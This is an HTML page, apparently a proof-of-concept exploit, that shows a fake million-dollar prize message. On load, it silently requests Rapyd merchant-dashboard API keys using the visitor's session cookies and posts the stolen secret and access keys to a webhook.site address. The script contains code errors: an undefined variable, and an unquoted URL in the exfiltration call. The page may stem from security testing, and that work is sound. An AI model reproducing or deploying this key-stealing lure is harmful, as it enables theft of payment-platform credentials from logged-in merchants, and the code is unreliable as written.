<!DOCTYPE html>
<html>
<head>
  <title>RAPYD SECRET STEALER</title>
  <meta charset="utf-8">
</head>
<body>
  <h2>ðŸŽ‰ CONGRATULATIONS! YOU WON $1,000,000! ðŸŽ‰</h2>
  <p>Claiming your prize...</p>
  <div id="status" style="color:green; font-weight:bold; margin:10px;"></div>

  <script>
    const TARGET = "https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys";
    const ATTACKER = "https://webhook.site/257b5906-77de-4391-a468-beaa821222c7"; // REPLACE WITH NEW WEBHOOK URL
    const status = document.getElementById('status');

    async function steal() {
      try {
        status.innerHTML = "1. Sending request to Rapyd...";

        const response = await fetch(rapyd, {
          method: 'GET',
          credentials: 'include',
          headers: {
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://shadowarpit.github.io' // LOWERCASE
          }
        });

        status.innerHTML = "2. Checking response...";

        // Log CORS headers for debugging
        const corsOrigin = response.headers.get('access-control-allow-origin');
        const corsCredentials = response.headers.get('access-control-allow-credentials');
        console.log("CORS Headers:", { corsOrigin, corsCredentials });

        if (!response.ok) {
          const text = await response.text();
          throw new Error(`HTTP ${response.status}: ${text.substring(0, 100)}`);
        }

        const data = await response.json();
        const secret = data.data?.organization_secret_key;
        const access = data.data?.organization_access_key;

        if (!secret || !access) throw new Error("Secret key not found in response");

        status.innerHTML = "3. SECRET STOLEN! Sending to webhook...";

        await fetch(https://webhook.site/257b5906-77de-4391-a468-beaa821222c7 {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            access_key: access,
            secret_key: secret,
            poc_url: window.location.href,
            timestamp: new Date().toISOString()
          })
        });

        status.innerHTML = "SUCCESS! Check webhook.site";
        console.log("STOLEN:", { access, secret });
      } catch (e) {
        status.innerHTML = "ERROR: " + e.message;
        console.error("Exploit error:", e);
      }
    }

    steal();
  </script>
</body>
</html>
